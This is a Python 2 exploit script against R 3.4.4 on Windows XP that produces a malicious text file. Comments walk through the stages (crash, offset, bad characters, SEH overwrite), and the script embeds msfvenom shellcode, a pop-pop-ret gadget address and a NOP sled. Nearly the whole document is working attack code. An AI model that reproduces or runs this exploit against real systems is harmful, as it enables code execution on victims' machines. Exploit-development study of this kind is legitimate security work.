#!/usr/bin/python2

# R 3.4.4
# Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/45289
# Exploit tested on Windows XP Pro SP3 FR

file = open("exploit-R.txt", "wb")

#msfvenom exec calc
shellcode =  b""
shellcode += b"\xd9\xeb\xb8\x94\x9d\x21\x52\xd9\x74\x24\xf4"
shellcode += b"\x5d\x31\xc9\xb1\x30\x31\x45\x18\x83\xc5\x04"
shellcode += b"\x03\x45\x80\x7f\xd4\xae\x40\xfd\x17\x4f\x90"
shellcode += b"\x62\x91\xaa\xa1\xa2\xc5\xbf\x91\x12\x8d\x92"
shellcode += b"\x1d\xd8\xc3\x06\x96\xac\xcb\x29\x1f\x1a\x2a"
shellcode += b"\x07\xa0\x37\x0e\x06\x22\x4a\x43\xe8\x1b\x85"
shellcode += b"\x96\xe9\x5c\xf8\x5b\xbb\x35\x76\xc9\x2c\x32"
shellcode += b"\xc2\xd2\xc7\x08\xc2\x52\x3b\xd8\xe5\x73\xea"
shellcode += b"\x53\xbc\x53\x0c\xb0\xb4\xdd\x16\xd5\xf1\x94"
shellcode += b"\xad\x2d\x8d\x26\x64\x7c\x6e\x84\x49\xb1\x9d"
shellcode += b"\xd4\x8e\x75\x7e\xa3\xe6\x86\x03\xb4\x3c\xf5"
shellcode += b"\xdf\x31\xa7\x5d\xab\xe2\x03\x5c\x78\x74\xc7"
shellcode += b"\x52\x35\xf2\x8f\x76\xc8\xd7\xbb\x82\x41\xd6"
shellcode += b"\x6b\x03\x11\xfd\xaf\x48\xc1\x9c\xf6\x34\xa4"
shellcode += b"\xa1\xe9\x97\x19\x04\x61\x35\x4d\x35\x28\x53"
shellcode += b"\x90\xcb\x56\x11\x92\xd3\x58\x05\xfb\xe2\xd3"
shellcode += b"\xca\x7c\xfb\x31\xaf\x73\xb1\x18\x99\x1b\x1c"
shellcode += b"\xc9\x98\x41\x9f\x27\xde\x7f\x1c\xc2\x9e\x7b"
shellcode += b"\x3c\xa7\x9b\xc0\xfa\x5b\xd1\x59\x6f\x5c\x46"
shellcode += b"\x59\xba\x3f\x09\xc9\x26\xc0"

#Step 1: Get the crash
buffer = b"A"*900

#Step 2: Get the offset
"""
900

1500

"""

#Step 3: Find badchars: \x00\x0a\x0d
badchars = b""
buffer = b"A"*292 + b"BBBB" + badchars


#Step 4: Trigger SEH and exploit
# Note: nSEH could be used to jump in the shellcode
# 0x643c21b1 : pop ebx # pop esi # ret  | 
pop_pop_ret = b"\xb1\x21\x3c\x64"
buffer = b"A"*884 + b"B"*4 +  pop_pop_ret + b"\x90"*100 + shellcode
buffer += b"C"*(1500-len(buffer))

file.write(buffer)
file.close()


